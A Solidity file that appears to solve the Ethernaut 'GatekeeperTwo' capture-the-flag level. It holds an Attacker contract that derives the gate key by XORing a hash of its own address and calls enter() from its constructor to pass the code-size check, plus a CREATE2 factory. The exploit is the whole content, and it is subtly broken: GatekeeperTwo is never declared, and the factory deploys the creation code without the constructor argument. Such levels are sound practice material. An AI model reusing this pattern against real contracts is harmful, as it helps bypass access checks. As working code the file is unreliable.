// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Create2.sol";

contract Attacker {
    constructor(address _instance) {
        bytes8 gateKey = computeGateKey();
        GatekeeperTwo(_instance).enter(gateKey);
    }

    function computeGateKey() internal view returns (bytes8) {
        bytes32 hash = keccak256(abi.encodePacked(address(this)));
        bytes8 hash8 = bytes8(hash);
        uint64 computedHash = uint64(hash8);
        uint64 key = computedHash ^ 0xFFFFFFFFFFFFFFFF;
        return bytes8(key);
    }
}

contract AttackFactory {
    function deployAttacker(address _instance) public returns (address) {
        bytes32 salt = keccak256(abi.encodePacked(msg.sender, block.timestamp));
        address attacker = Create2.deploy(
            0, 
            salt, 
            type(Attacker).creationCode
        );
        return attacker;
    }
}